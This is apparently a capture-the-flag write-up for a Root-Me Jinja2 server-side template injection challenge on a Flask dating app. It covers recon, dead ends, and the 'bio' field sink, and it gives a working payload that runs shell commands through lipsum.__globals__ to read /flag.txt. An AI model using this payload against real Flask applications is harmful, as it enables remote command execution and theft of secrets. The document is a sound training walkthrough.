# SSTI - Python - Introduction — notes

Target: `https://instance-019fe9e3-a6de-72c7-9cf7-76c651bf1127.challenges.root-me.pro/`
App: "RMeet" dating app, Flask + gunicorn + Jinja2. Web / Medium / 300 pts.
Brief: `7*7 == 49`. Flag at `/flag.txt`, format `RM{...}`.

Same codebase as `../ssti-python-filter-bypass` — but a **different sink** and **no filter**.

## Recon

- `/` → `/login`, `/register`. Flask-WTF forms, `csrf_token` on every POST.
- Registered `pauk01` (id 10). Registration auto-authenticates → `/start`.
- Routes: `/start`, `/swipe`, `/matches`, `/photos`, `/profile/<username>`,
  `/config.js` (rendered: `window.myUserId = 10;`), `/messages/<username>`,
  API `POST /api/swipe` `{user_id, direction}`, `GET /api/user/<id>`.
- Profile fields: `full_name`, `age`, `gender`, `location`, `bio`, `interests`.

### Gotchas that cost time

- `gender` must be exactly `Male`/`Female`/`Other`. Sending `male` fails validation
  **silently** — the form re-renders, every field stays `None`, and it looks like the
  fields just aren't stored. Check for the "Your profile has been updated!" flash.
- Don't name a local script `enum.py` — it shadows stdlib `enum` and `import requests`
  dies with a confusing circular-import error.

## Dead ends

- `/messages/<user>` — the sink for the *filter-bypass* sibling challenge. Here messages
  are stored and echoed **raw** (`{{7*7}}` stays `{{7*7}}`, not even HTML-escaped —
  stored XSS, but no template evaluation). Reaching it still needs a forced match:
  account B likes A via `/api/swipe`, then A likes B → `match_created: true`.
- `full_name`, `location`, `interests`, `age` — escaped in every view.
- `/profile/<user>` (own **and** matched user's) — bio escaped here.
- `/matches`, `/api/user/<id>` (raw JSON), `/config.js`, `/start`, 404 handler.
- Username registered as `u{{7*7}}u` — stored, never evaluated.
- Upload filenames — server renames to a random hex UUID.
- Query params on every known route, path segments — no reflection.

## The sink

**`bio`, rendered on the swipe *card*.** The card template is what runs the bio through
`render_template_string()`; it's served at both `/` and `/swipe` (whichever currently
holds that viewer's card).

The same bio string is escaped everywhere else — `/profile/<user>` and `/matches` — which
is exactly why this is easy to walk past. I probed all six profile fields with distinct
markers (`N{{7*7}}N`, `L{{7*7}}L`, `B{{7*7}}B`, `I{{7*7}}I`) and only `B49B` came back
evaluated, and only on the card view.

Second catch: **you can't see your own card.** The payload has to be planted on account A
and viewed from account B, and B only sees A's card once the swipe queue reaches it — so
you swipe left through the seeded bot profiles until A's card comes up.

## Exploit

No filter at all in this variant — plain `{{ }}` and full dunder access work:

```jinja
{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}
```

`lipsum` is a Jinja global defined in `jinja2.utils`, which does `import os` — so its
`__globals__` hands over `os` directly. (`self`, `cycler`, `namespace`, `url_for`,
`request`, `config` are all available too; `config` alone would leak `SECRET_KEY`.)

1. Attacker account sets `bio` to the payload above.
2. Viewer account swipes left through the queue until the attacker's card renders.
3. The bio bubble contains the flag.

Verified render on the card: `<div class="profile-bio">RM{0c4bb76e02f9a8a44ca9db638cf3b6ac}</div>`

## Flag

`RM{0c4bb76e02f9a8a44ca9db638cf3b6ac}`

## Status

Flag captured and confirmed against the live instance. The instance was torn down shortly
after (all routes 404), so the consolidated `exploit.py` could not be re-run end-to-end —
every step in it was executed live during the solve, but the script as a single unit is
unverified. Point it at a fresh instance URL to replay: `python3 exploit.py <base_url>`.
